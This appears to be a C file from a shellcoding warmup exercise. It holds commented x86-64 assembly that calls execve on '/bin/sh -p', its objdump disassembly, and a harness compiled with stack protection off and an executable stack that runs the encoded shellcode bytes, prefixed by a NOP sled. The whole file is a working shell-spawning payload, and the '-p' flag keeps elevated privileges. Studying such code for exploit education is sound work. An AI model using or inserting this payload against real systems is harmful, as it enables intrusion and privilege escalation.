// ##
// #  shell2_64.s - Executes "/bin/sh"
// #    Compile and Link:
// #        gcc -c shell2_64.s
// #        ld -o shell2_64 shell2_64.o
// .text
// .global _start

// _start:
//     push %rbp
//     mov %rsp, %rbp

//     xor %r8, %r8

//     # push "-p" onto the stack
//     mov $0x702d, %r8w
//     push %r8
//     # save location of "-p" into %r9
//     mov %rsp, %r9

//     # mov "/bin/shA" into %r8
//     mov $0x4168732f6e69622f, %r8
//     # shift %r8 left 8 bits, and then back right 8 bits
//     # this zeros the "A" on the end of "/bin/shA"
//     shl $0x8, %r8
//     shr $0x8, %r8
//     # push "/bin/sh" on the stack
//     push %r8
//     # save the address of "/bin/sh" into %rdi
//     mov %rsp, %rdi

//     # push a null entry on the stack
//     xor %r8, %r8
//     push %r8
//     # push a pointer to "-p" on the stack
//     push %r9
//     # push a pointer to "/bin/sh" on the stack
//     push %rdi

//     # set pointers to argv and envp
//     mov %rsp, %rsi
//     xor %rdx, %rdx

//     # call execve(char * program, char * argv[], char * envp[])
//     xor %rax, %rax
//     mov $0x3b, %al

//     syscall

//     # we pushed 5*8 bytes of data onto the stack, so remove it
//     add $0x28, %rsp
//     pop %rbp
//     ret





// [howard@sterling shellcodes]$ objdump -Dz obj/shell2_64.o 

// obj/shell2_64.o:     file format elf64-x86-64


// Disassembly of section .text:

// 0000000000000000 <_start>:
//    0:    55                       push   %rbp
//    1:    48 89 e5                 mov    %rsp,%rbp
//    4:    4d 31 c0                 xor    %r8,%r8
//    7:    66 41 b8 2d 70           mov    $0x702d,%r8w
//    c:    41 50                    push   %r8
//    e:    49 89 e1                 mov    %rsp,%r9
//   11:    49 b8 2f 62 69 6e 2f     movabs $0x4168732f6e69622f,%r8
//   18:    73 68 41 
//   1b:    49 c1 e0 08              shl    $0x8,%r8
//   1f:    49 c1 e8 08              shr    $0x8,%r8
//   23:    41 50                    push   %r8
//   25:    48 89 e7                 mov    %rsp,%rdi
//   28:    4d 31 c0                 xor    %r8,%r8
//   2b:    41 50                    push   %r8
//   2d:    41 51                    push   %r9
//   2f:    57                       push   %rdi
//   30:    48 89 e6                 mov    %rsp,%rsi
//   33:    48 31 d2                 xor    %rdx,%rdx
//   36:    48 31 c0                 xor    %rax,%rax
//   39:    b0 3b                    mov    $0x3b,%al
//   3b:    0f 05                    syscall 
//   3d:    48 83 c4 28              add    $0x28,%rsp
//   41:    5d                       pop    %rbp
//   42:    c3                       retq




//gcc SHELLCODING_S_H_E_E_P__W_A_R_M_U_P.c -o shellcode -fno-stack-protector -z execstack

#include <stdio.h>
#include <string.h>

int main()
{
    char code[] = "\xeb\x0a\x90\x90\x90\x90\x90\x90"
                  "\x90\x90\x90\x90\x55\x48\x89\xe5"
                  "\x4d\x31\xc0\x66\x41\xb8\x2d\x70"
                  "\x41\x50\x49\x89\xe1\x49\xb8\x2f"
                  "\x62\x69\x6e\x2f\x73\x68\x41\x49"
                  "\xc1\xe0\x08\x49\xc1\xe8\x08\x41"
                  "\x50\x48\x89\xe7\x4d\x31\xc0\x41"
                  "\x50\x41\x51\x57\x48\x89\xe6\x48"
                  "\x31\xd2\x48\x31\xc0\xb0\x3b\x0f"
                  "\x05\x48\x83\xc4\x28\x5d\xc3";
                  
    printf("Shellcode length: %ld\n", strlen(code));
    int (*ret)() = (int (*)())code;
    return ret();
}